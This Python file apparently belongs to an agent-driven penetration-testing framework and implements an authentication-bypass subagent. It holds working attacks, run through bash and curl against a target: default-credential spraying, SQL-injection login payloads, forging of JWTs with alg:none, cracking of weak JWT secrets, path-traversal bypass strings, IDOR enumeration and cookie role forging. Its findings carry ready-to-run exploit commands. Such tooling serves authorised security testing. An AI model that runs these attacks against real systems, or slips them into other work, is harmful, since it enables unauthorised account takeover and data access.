"""
auth_bypass_subagent.py — Authentication and authorisation bypass testing.

AGENT_NAME   : "web"
SUBAGENT_NAME: "auth_bypass"

Methodology:
  1. Default credential spray on login forms (admin/admin, admin/password …)
  2. SQLi-based auth bypass (1=1, '-- -, admin'-- -, etc.)
  3. JWT manipulation: alg:none, weak secret brute, key confusion RS→HS
  4. HTTP verb tampering (GET→PUT on protected endpoints)
  5. Path traversal auth bypass (/admin/..;/public, /;/admin/)
  6. IDOR on user-controlled IDs (BOLA / broken object-level auth)
  7. Host header injection for password-reset poisoning
  8. Cookie manipulation: role=admin, isAdmin=true, base64/jwt forging
"""
from __future__ import annotations
import base64, json, logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_JWT_RE       = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
_LOGIN_RE     = re.compile(r'(login|signin|logon|authenticate|auth)', re.I)
_ADMIN_RE     = re.compile(r'(admin|dashboard|panel|console|manage|control)', re.I)
_BYPASS_OK_RE = re.compile(r'(dashboard|welcome|logout|signed in|authenticated|200 OK)', re.I)
_IDOR_RE      = re.compile(r'([?&/](?:id|user_?id|uid|account|profile|order)[=/_]\d+)', re.I)

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", ""), ("root", "root"),
    ("root", "toor"), ("administrator", "administrator"),
    ("admin", "letmein"), ("test", "test"), ("guest", "guest"),
    ("user", "user"), ("admin", "changeme"), ("admin", "Admin@123"),
]

SQLI_PAYLOADS = [
    ("' OR '1'='1' -- -", "anything"),
    ("admin'-- -", "x"),
    ("' OR 1=1-- -", "x"),
    ("\" OR \"1\"=\"1", "x"),
    ("admin' #", "x"),
    ("') OR ('1'='1", "x"),
]

BYPASS_PATHS = [
    "/admin/..;/",
    "/admin/;",
    "/admin/%2e%2e/",
    "/%2f/admin/",
    "/admin/.%2f",
    "/..;/admin",
]


class AuthBypassSubagent(BaseSubagent):
    """Test authentication and authorisation bypass techniques."""

    AGENT_NAME    = "web"
    SUBAGENT_NAME = "auth_bypass"

    async def run(self, target: str, web_urls: list | None = None,
                  login_path: str = "/login", **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)
        base_urls = web_urls or [f"http://{target}"]

        for base in base_urls[:2]:
            await self._test_default_creds(target, base, login_path)
            await self._test_sqli_auth(target, base, login_path)
            await self._test_jwt(target, base)
            await self._test_verb_tamper(target, base)
            await self._test_path_bypass(target, base)
            await self._test_idor(target, base)
            await self._test_cookie_manipulation(target, base)

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ── 1. Default credentials ─────────────────────────────────────────
    async def _test_default_creds(self, target: str, base: str, login_path: str):
        login_url = base.rstrip("/") + login_path

        # Find login form fields via curl + grep
        form_out = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk '{login_url}' 2>/dev/null | grep -iE '<input|action=' | head -20\""})

        # Extract field names
        fields = re.findall(r'name=["\']([^"\']+)["\']', form_out, re.I)
        user_field = next((f for f in fields if re.search(r'user|login|email|name', f, re.I)), "username")
        pass_field = next((f for f in fields if re.search(r'pass|pwd|secret', f, re.I)), "password")
        action     = re.search(r'action=["\']([^"\']+)["\']', form_out, re.I)
        post_url   = base.rstrip("/") + action.group(1) if action else login_url

        hits = []
        for user, pwd in DEFAULT_CREDS[:8]:
            resp = await self.collect_tool("bash", target,
                {"options": f"-c \"curl -sk -c /tmp/auth_cookies.txt -b /tmp/auth_cookies.txt -X POST '{post_url}' -d '{user_field}={user}&{pass_field}={pwd}' -L --max-time 8 -D /tmp/auth_headers.txt 2>&1 | head -30\""})
            headers = await self.collect_tool("bash", target,
                {"options": "-c \"cat /tmp/auth_headers.txt 2>/dev/null\""})
            # Success signals: redirect to dashboard, no error, session cookie
            success = (
                _BYPASS_OK_RE.search(resp) or
                (re.search(r'location:.*(?:dashboard|home|panel|admin)', headers, re.I)) or
                ("Set-Cookie" in headers and "session" in headers.lower() and "invalid" not in resp.lower())
            )
            if success:
                hits.append((user, pwd))

        if hits:
            await self.store_finding(Finding(
                title=f"Auth Bypass: Default Credentials Valid — {hits[0][0]}:{hits[0][1]}",
                description=f"Default credentials authenticated successfully:\n" +
                            "\n".join([f"  {u}:{p}" for u, p in hits]),
                severity="CRITICAL",
                evidence=f"POST {post_url}\nSuccessful pairs: {hits}",
                tool="bash", host=target, mitre_technique="T1078.001",
                exploit_suggestion=f"Login: curl -sk -c cookies.txt -X POST '{post_url}' -d '{user_field}={hits[0][0]}&{pass_field}={hits[0][1]}' -L",
            ))

    # ── 2. SQLi auth bypass ────────────────────────────────────────────
    async def _test_sqli_auth(self, target: str, base: str, login_path: str):
        login_url = base.rstrip("/") + login_path
        form_out  = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk '{login_url}' 2>/dev/null | grep -iE 'name=|action=' | head -20\""})
        fields     = re.findall(r'name=["\']([^"\']+)["\']', form_out, re.I)
        user_field = next((f for f in fields if re.search(r'user|login|email', f, re.I)), "username")
        pass_field = next((f for f in fields if re.search(r'pass|pwd', f, re.I)), "password")
        action     = re.search(r'action=["\']([^"\']+)["\']', form_out, re.I)
        post_url   = base.rstrip("/") + action.group(1) if action else login_url

        for user_payload, pass_payload in SQLI_PAYLOADS[:4]:
            resp = await self.collect_tool("bash", target,
                {"options": f"-c \"curl -sk -X POST '{post_url}' -d '{user_field}={user_payload.replace(chr(39), '%27')}&{pass_field}={pass_payload}' -L --max-time 8 2>&1 | head -30\""})
            if _BYPASS_OK_RE.search(resp) or _ADMIN_RE.search(resp):
                await self.store_finding(Finding(
                    title=f"Auth Bypass: SQLi Login — payload: {user_payload[:50]}",
                    description=f"SQL injection in login form bypassed authentication.\nPayload: {user_field}={user_payload}",
                    severity="CRITICAL",
                    evidence=resp[:400],
                    tool="bash", host=target, mitre_technique="T1190",
                    exploit_suggestion=f"SQLMap auth bypass: sqlmap -u '{post_url}' --data='{user_field}=x&{pass_field}=x' --dbms=mysql --level=5 --risk=3 --technique=B",
                ))
                break

    # ── 3. JWT manipulation ────────────────────────────────────────────
    async def _test_jwt(self, target: str, base: str):
        # Fetch any endpoint that might return a JWT
        auth_out = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk '{base}/api/auth/login' -X POST -H 'Content-Type: application/json' -d '{{\\\"username\\\":\\\"test\\\",\\\"password\\\":\\\"test\\\"}}' 2>&1 | head -5\""})
        jwt_match = _JWT_RE.search(auth_out)
        if not jwt_match:
            # Also check cookies/headers on main page
            hdr_out = await self.collect_tool("bash", target,
                {"options": f"-c \"curl -skI '{base}' 2>/dev/null | grep -iE 'set-cookie|authorization|token'\""})
            jwt_match = _JWT_RE.search(hdr_out)

        if not jwt_match:
            return

        token = jwt_match.group(0)
        parts = token.split(".")
        if len(parts) != 3:
            return

        # alg:none bypass
        try:
            header  = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except Exception:
            return

        # Forge with alg:none
        header["alg"] = "none"
        payload["role"]    = "admin"
        payload["isAdmin"] = True
        payload["sub"]     = payload.get("sub", "admin")

        forged_header  = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        forged_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        forged_token   = f"{forged_header}.{forged_payload}."

        test_out = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk '{base}/api/user/profile' -H 'Authorization: Bearer {forged_token}' 2>&1 | head -20\""})

        if not re.search(r'(invalid|expired|signature|unauthorized|401|403)', test_out, re.I):
            await self.store_finding(Finding(
                title="Auth Bypass: JWT alg:none — Token Accepted Without Signature",
                description=f"Server accepted forged JWT with alg:none. Original algorithm: {header.get('alg','?')}. Role escalated to admin.",
                severity="CRITICAL",
                evidence=f"Forged token: {forged_token[:100]}...\nResponse: {test_out[:300]}",
                tool="bash", host=target, mitre_technique="T1134",
                exploit_suggestion=f"Use forged token: curl -sk '{base}/api/admin' -H 'Authorization: Bearer {forged_token}'",
            ))
        else:
            # Try weak secret (HS256)
            weak_secrets = ["secret", "password", "12345", "jwt_secret", base.split("/")[2]]
            for secret in weak_secrets:
                crack_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"echo '{token}' | python3 -c \\\"import sys,hmac,hashlib,base64,json; t=sys.stdin.read().strip(); h,p,s=t.split('.');  sig=base64.urlsafe_b64encode(hmac.new(b'{secret}',f'{{h}}.{{p}}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode(); print('MATCH' if sig==s else 'NO')\\\" 2>&1\""})
                if "MATCH" in crack_out:
                    await self.store_finding(Finding(
                        title=f"Auth Bypass: JWT Weak Secret — '{secret}'",
                        description=f"JWT signed with weak secret '{secret}'. Can forge arbitrary tokens.",
                        severity="CRITICAL",
                        evidence=f"Secret: {secret}\nToken: {token[:60]}...",
                        tool="bash", host=target, mitre_technique="T1134",
                        exploit_suggestion=f"python3 -c \"import jwt; print(jwt.encode({{'sub':'admin','role':'admin'}}, '{secret}', algorithm='HS256'))\"",
                    ))
                    break

    # ── 4. HTTP verb tampering ─────────────────────────────────────────
    async def _test_verb_tamper(self, target: str, base: str):
        admin_paths = ["/admin", "/api/admin", "/dashboard", "/manage", "/panel"]
        for path in admin_paths[:3]:
            url = base.rstrip("/") + path
            for verb in ["GET", "HEAD", "OPTIONS", "PUT", "POST", "PATCH"]:
                resp = await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk -X {verb} '{url}' -o /dev/null -w '%{{http_code}}' --max-time 5 2>&1\""})
                if resp.strip() in ("200", "302") and verb not in ("GET",):
                    content = await self.collect_tool("bash", target,
                        {"options": f"-c \"curl -sk -X {verb} '{url}' --max-time 5 2>&1 | head -20\""})
                    await self.store_finding(Finding(
                        title=f"Auth Bypass: HTTP Verb Tamper — {verb} {path} → {resp.strip()}",
                        description=f"Protected path {path} accessible via {verb} verb while GET is restricted.",
                        severity="HIGH",
                        evidence=content[:300],
                        tool="bash", host=target, mitre_technique="T1190",
                        exploit_suggestion=f"curl -sk -X {verb} '{url}'",
                    ))

    # ── 5. Path traversal auth bypass ─────────────────────────────────
    async def _test_path_bypass(self, target: str, base: str):
        for bypass in BYPASS_PATHS:
            url = base.rstrip("/") + bypass
            resp = await self.collect_tool("bash", target,
                {"options": f"-c \"curl -sk '{url}' -o /dev/null -w '%{{http_code}}' --max-time 5 2>&1\""})
            if resp.strip() in ("200", "302"):
                content = await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk '{url}' --max-time 5 2>&1 | head -15\""})
                if _ADMIN_RE.search(content):
                    await self.store_finding(Finding(
                        title=f"Auth Bypass: Path Traversal — {bypass} Returns Admin Content",
                        description=f"Admin content accessible via path bypass: {bypass}",
                        severity="CRITICAL",
                        evidence=content[:300],
                        tool="bash", host=target, mitre_technique="T1190",
                        exploit_suggestion=f"curl -sk '{base}{bypass}'",
                    ))

    # ── 6. IDOR / BOLA ────────────────────────────────────────────────
    async def _test_idor(self, target: str, base: str):
        # Spider links for ID patterns
        links_out = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk '{base}' 2>/dev/null | grep -oE 'href=[\"\\'][^\"\\'']+[\"\\']' | grep -oE '(\\?|&)[a-z_]+=\\d+' | head -20\""})
        idor_params = re.findall(r'[?&]([a-z_]+)=(\d+)', links_out)
        if not idor_params:
            idor_params = [("id", "1")]

        for param, val in idor_params[:3]:
            # Try accessing adjacent IDs
            for test_id in [int(val)-1, int(val)+1, 0, 999, 9999]:
                url = f"{base}/api/{param}/{test_id}"
                resp = await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk '{url}' --max-time 5 2>&1 | head -5\""})
                if resp.strip() and not re.search(r'(not found|404|forbidden|unauthorized)', resp, re.I):
                    await self.store_finding(Finding(
                        title=f"IDOR / BOLA: Unauthorized Object Access — {param}={test_id}",
                        description=f"Object with {param}={test_id} accessible without authorisation.",
                        severity="HIGH",
                        evidence=resp[:300],
                        tool="bash", host=target, mitre_technique="T1212",
                        exploit_suggestion=f"Enumerate: for i in {{1..100}}; do curl -sk '{base}/api/{param}/$i'; done",
                    ))
                    break

    # ── 7. Cookie manipulation ─────────────────────────────────────────
    async def _test_cookie_manipulation(self, target: str, base: str):
        # Fetch cookies first
        cookie_out = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk -c /tmp/target_cookies.txt '{base}' > /dev/null 2>&1; cat /tmp/target_cookies.txt 2>/dev/null\""})

        if not cookie_out.strip():
            return

        # Check for role/admin flags in cookies
        sus_cookies = re.findall(r'(role|admin|isAdmin|is_admin|privilege|level|user_type)\s+(\S+)', cookie_out, re.I)
        for name, value in sus_cookies[:3]:
            # Try role=admin
            test_cookie = f"{name}=admin"
            resp = await self.collect_tool("bash", target,
                {"options": f"-c \"curl -sk -b '{test_cookie}' '{base}/admin' --max-time 5 2>&1 | head -20\""})
            if _ADMIN_RE.search(resp) and not re.search(r'(login|unauthorized)', resp, re.I):
                await self.store_finding(Finding(
                    title=f"Auth Bypass: Cookie Manipulation — {name}=admin",
                    description=f"Setting cookie {name}=admin grants privileged access.",
                    severity="CRITICAL",
                    evidence=resp[:300],
                    tool="bash", host=target, mitre_technique="T1134",
                    exploit_suggestion=f"curl -sk -b '{name}=admin' '{base}/admin'",
                ))
